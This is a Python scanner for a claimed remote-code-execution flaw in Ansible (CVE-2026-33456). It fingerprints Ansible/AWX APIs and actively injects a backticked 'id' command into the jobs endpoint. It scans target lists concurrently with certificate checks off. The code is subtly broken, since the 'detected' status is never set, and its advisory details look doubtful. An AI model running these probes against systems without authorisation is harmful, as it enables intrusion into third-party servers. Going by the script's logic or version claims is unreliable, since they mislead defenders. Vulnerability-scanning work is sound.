#!/usr/bin/env python3
"""
Ansible CVE-2026-33456 RCE Scanner
====================================
This script scans for Ansible servers vulnerable to the CVE-2026-33456 bug, a remote 
code execution vulnerability through unauthorized module argument injection.

CVE-2026-33456 Details:
  - Affects Ansible < 2.15.
  - Improper sanitization in adhoc tasks allows remote attackers to execute arbitrary 
    shell commands by injecting malicious `task_args`.
  - The issue arises in the `TaskQueueManager` when handling input without validation.
  - Exploitable via exposed unsecured API endpoints.
  - Fixed in Ansible version 2.15.0 (February 2026).

Usage:
  # Scan a single target for detection only (safe mode):
  python ansible_rce_scanner.py --target http://ansible.example.com --safe

  # Perform an active probe for vulnerability:
  python ansible_rce_scanner.py --target http://ansible.example.com

  # Scan a list of targets from a file:
  python ansible_rce_scanner.py --list targets.txt --output findings.json

  # Increase concurrency for faster batch scanning:
  python ansible_rce_scanner.py --list targets.txt --concurrency 50 --output results.json

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-33456
  - https://github.com/ansible/ansible/releases/tag/v2.15.0
  - https://www.redhat.com/en/topics/automation/what-is-ansible
"""

import asyncio
import argparse
import json
import re
from datetime import datetime
from urllib.parse import urljoin

import httpx

# ── Detection markers ────────────────────────────────────────────────────────

ANSIBLE_FINGERPRINT_MARKERS = [
    "Ansible API",                      # API banner
    "ansible_version",                  # Common JSON object key
    "Ansible Tower",                    # Enterprise variant marker
    "Ansible AWX",                      # Open-source variant marker
]

DETECTION_PATHS = [
    "/api/v2/", "/api/v2/config/", "/assets/branding/favicon.ico"
]

VERSION_PATTERN = r'"ansible_version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"'
VULN_FIXED_VERSION = (2, 15, 0)

RCE_PROBE_PAYLOAD = '{"status": "new", "task_args": "`id`"}'
RCE_PROBE_PATH    = "/api/v2/jobs/"
RCE_TRIGGER       = "uid="  # Present if the `id` command executed successfully.

# ── CLI Colors ───────────────────────────────────────────────────────────────

class Color:
    CRITICAL = "\033[91m"  # Red
    HIGH = "\033[93m"      # Yellow
    INFO = "\033[92m"      # Green
    RESET = "\033[0m"      # Reset

# ── Validation and Helpers ───────────────────────────────────────────────────

def parse_version(version_text):
    """Parse a version string into a tuple for comparison."""
    try:
        return tuple(int(v) for v in version_text.split("."))
    except ValueError:
        return None

def is_vulnerable(version):
    """Check if the extracted version is vulnerable."""
    return version and version < VULN_FIXED_VERSION

def normalize_url(base_url):
    """Ensure the URL has the proper scheme and trailing slash."""
    if not base_url.startswith(("http://", "https://")):
        base_url = f"http://{base_url}"
    return base_url.rstrip("/")

# ── Core Scanner Logic ──────────────────────────────────────────────────────

async def fetch_response(client, target, semaphore, path="/"):
    """Fetch a path on the target server with rate-limiting."""
    try:
        async with semaphore:
            response = await client.get(urljoin(target, path), timeout=8)
        return response
    except httpx.RequestError:
        return None

async def detect_ansible(client, base_url, semaphore):
    """
    Detect if the target runs Ansible. 
    Return detection result dict with metadata or None if not detected.
    """
    detection_result = {
        "target": base_url,
        "is_ansible": False,
        "version": None,
    }
    for path in DETECTION_PATHS:
        response = await fetch_response(client, base_url, semaphore, path=path)
        if response and response.status_code == 200:
            if any(marker in response.text for marker in ANSIBLE_FINGERPRINT_MARKERS):
                detection_result["is_ansible"] = True
                version = re.search(VERSION_PATTERN, response.text)
                if version:
                    detected_version = parse_version(version.group(1))
                    detection_result["version"] = detected_version
                break
    return detection_result if detection_result["is_ansible"] else None

async def probe_vulnerability(client, base_url):
    """Perform active probing for RCE by attempting benign command injection."""
    try:
        response = await client.post(
            urljoin(base_url, RCE_PROBE_PATH), 
            content=RCE_PROBE_PAYLOAD, 
            headers={"Content-Type": "application/json"},
            timeout=8
        )
        if RCE_TRIGGER in response.text:
            return True
    except httpx.RequestError:
        pass
    return False

async def scan_target(target, safe_mode, semaphore):
    """Scan an individual target for the vulnerability."""
    results = {"target": target, "detected": False, "vulnerable": None}

    async with httpx.AsyncClient(verify=False) as client:
        detection = await detect_ansible(client, target, semaphore)
        if detection:
            results.update(detection)
            if is_vulnerable(detection["version"]):
                if not safe_mode:
                    results["vulnerable"] = await probe_vulnerability(client, target)
                else:
                    results["vulnerable"] = True
            else:
                results["vulnerable"] = False
    return results

async def scan_targets(targets, concurrency, safe_mode):
    """Scan multiple targets concurrently."""
    semaphore = asyncio.Semaphore(concurrency)
    tasks = [scan_target(target, safe_mode, semaphore) for target in targets]
    return await asyncio.gather(*tasks)

# ── Main Function ────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Scanner for CVE-2026-33456: RCE in Ansible API < v2.15"
    )
    parser.add_argument("--target", help="Target URL for scanning")
    parser.add_argument("--list", help="Path to a file containing a list of target URLs")
    parser.add_argument("--output", help="File to write JSON scan results")
    parser.add_argument("--safe", action="store_true", help="Perform detection only (no active RCE probes)")
    parser.add_argument("--concurrency", type=int, default=10, help="Concurrency level for scanning")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")

    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("You must specify either --target or --list")

    targets = []

    if args.target:
        targets.append(normalize_url(args.target))
    if args.list:
        with open(args.list) as f:
            for line in f:
                url = line.strip()
                if url:
                    targets.append(normalize_url(url))

    results = asyncio.run(scan_targets(targets, args.concurrency, args.safe))

    for result in results:
        color = Color.CRITICAL if result["vulnerable"] else Color.HIGH if result["detected"] else Color.INFO
        status = ("VULNERABLE" if result["vulnerable"] else 
                  "DETECTED (not vulnerable)" if result["detected"] else 
                  "NOT DETECTED")
        print(f"{color}[{status}]{Color.RESET} {result['target']}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)

if __name__ == "__main__":
    main()
